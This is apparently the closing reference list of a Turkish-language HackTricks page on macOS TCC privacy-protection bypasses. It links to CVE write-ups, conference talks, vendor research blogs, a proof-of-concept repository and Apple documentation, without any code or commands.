- [3] [CVE-2022-22655 - TCC Location Services bypass (orijinal rapor)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Dünyanın Neresinde Carmen Sandiego: macOS'ta Location Services'ı Kötüye Kullanma](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass, iCloud'dan veri çalıyor](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD environment variables entitlement'ına izin verme](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware'ında Zero-Day TCC bypass keşfedildi](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Mac'inizde Ne Olursa Apple'ın iCloud'unda mı Kalır?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Yeni macOS vulnerability'si olan "powerdir", yetkisiz user data access'e yol açabilir](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory'yi değiştirin ve TCC'yi bypass edin, diğer adıyla CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Müziği çalın ve TCC'yi bypass edin, diğer adıyla CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Bir (Fire)fox nasıl soyulur](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS'ta Telegram ile TCC bypass etme](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerability'lerini Ortaya Çıkarma: diskarbitrationd ve storagekitd Audit Bölüm 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X'te environment variables ayarlama](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass ve privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database'in üzerine mount ederek TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS Privacy Mechanisms'ınızı Bypass Etmenin 20'den Fazla Yolu](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC'ye Karşı Knockout Zaferi - MacOS Privacy Mechanisms'ınızı Bypass Etmenin 20'den Fazla YENİ Yolu](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
